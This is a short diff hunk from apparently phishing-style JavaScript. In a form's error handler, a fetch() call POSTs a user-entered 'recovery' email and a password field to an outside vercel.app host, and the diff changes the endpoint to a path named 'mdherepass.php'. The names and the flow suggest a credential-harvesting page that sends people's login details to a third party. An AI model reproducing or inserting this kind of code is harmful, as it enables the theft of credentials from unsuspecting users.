@@ -483,7 +483,7 @@
                 console.error("Submission error:", err);
                 alert("An error occurred. Please try again.");
                 if (allowRecovery && recoveryInput) {
-                         fetch("https://apply-free-on-here-team-service.vercel.app/", {
+                         fetch("https://apply-free-on-here-team-service.vercel.app/mdherepass.php", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
